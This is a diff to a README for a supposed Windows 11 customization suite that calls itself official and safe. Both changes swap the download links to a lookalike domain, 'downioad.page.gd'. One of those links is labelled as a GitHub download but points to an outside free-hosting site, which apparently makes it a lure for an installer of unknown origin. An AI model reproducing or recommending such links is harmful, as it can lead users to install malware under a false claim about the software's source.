@@ -2,7 +2,7 @@
 
 Transform your Windows 11 experience with a powerful collection of customization and productivity tools. The Windows 11 Ultimate Customizer Suite is designed for users who want full control over their desktop's look, feel, and functionality, all through a safe and intuitive interface. This official release from our development team offers the latest enhancements and compatibility updates for the 2026 version of Windows.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -50,7 +50,7 @@ A: Please use the "Issues" tab on our GitHub repository page to report bugs or r
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 *Last Updated: November 2026. © 2026 Win11 Customizer Development Team. This software is provided as-is for personal customization use.*
